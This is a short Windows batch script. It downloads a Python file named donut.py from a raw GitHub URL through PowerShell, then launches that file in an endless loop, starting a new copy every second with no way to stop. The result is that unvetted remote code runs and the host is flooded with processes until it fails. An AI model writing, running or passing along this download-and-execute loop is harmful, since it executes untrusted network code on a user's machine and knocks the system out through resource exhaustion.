@echo off

powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/RandomThings23/donut/main/donut.py' -OutFile donut.py"

:a

start donut.py

timeout /T 1 /nobreak

goto a